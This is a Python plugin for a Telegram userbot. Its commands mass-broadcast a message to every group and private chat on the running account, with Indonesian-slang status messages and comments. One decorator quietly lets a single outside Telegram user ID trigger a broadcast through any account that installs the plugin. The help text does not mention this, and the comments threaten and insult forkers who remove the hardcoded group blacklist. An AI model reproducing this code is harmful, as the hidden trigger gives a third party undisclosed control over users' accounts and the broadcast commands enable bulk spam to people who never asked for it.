from userbot.events import register
from userbot import CMD_HELP, bot

GCAST_BLACKLIST = [
    -1001743853750,  # Cariteman
    -1001704645461,  # Bdrl
    -1001473548283,  #sharing
    -1001217578068,  #ouraa
] 

# Kalo fork atau coppy blacklist jangan dihapus bangsat,
# Gua tandain telegram api lu
# Hapus blacklist bapak lu jelek gua gban!.

@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=5090127753, 
          pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("**𝙉𝙜𝙚𝙩𝙞𝙠 𝘿𝙪𝙡𝙪 𝙔𝙖𝙣𝙜 𝘽𝙚𝙣𝙚𝙧𝙧 𝙉𝙜𝙚𝙣𝙩𝙤𝙩𝙩**")
        return
    kk = await event.edit("`𝙎𝙖𝙗𝙖𝙧 𝙉𝙜𝙖𝙥𝙖 𝙉𝙜𝙚𝙣𝙩𝙤𝙙... 𝙇𝙖𝙜𝙞 𝙂𝙪𝙖 𝙋𝙧𝙤𝙢𝙤𝙨𝙞 𝙞𝙣 𝘽𝙤𝙠𝙚𝙥𝙣𝙮𝙖 𝙆𝙚 𝙂𝙘², 𝙇𝙞𝙢𝙞𝙩 𝙈𝙖𝙢𝙥𝙪𝙨 𝙇𝙪 𝘼𝙣𝙟𝙚𝙣𝙜...`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**𝙎𝙪𝙠𝙨𝙚𝙨 𝙎𝙖𝙮𝙖𝙣𝙜 𝙋𝙧𝙤𝙢𝙤𝙨𝙞 𝘽𝙤𝙠𝙚𝙥 𝙉𝙮𝙖 𝙇𝙖𝙠𝙪 𝘿𝙞** `{done}` **𝙂𝙧𝙪𝙥, 𝙏𝙖𝙥𝙞... 𝙂𝙖 𝙇𝙖𝙠𝙪 𝘿𝙞** `{er}` **𝙂𝙧𝙪𝙥 𝙆𝙖𝙧𝙣𝙖 𝙈𝙞𝙨𝙠𝙞𝙣**"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("**Berikan Sebuah Pesan atau Balas ke pesan**")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("`GCAST MULU DAPET DOI KAGA, LIMIT IYA TOLOL...`")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(
        f"**GCAST'AN LU DAH TERKIRIM DI** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
    )

CMD_HELP.update(
    {
        "gcast": "**Plugin : **`gcast`\
        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)

CMD_HELP.update(
    {
        "gucast": "**Plugin : **`gucast`\
        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)
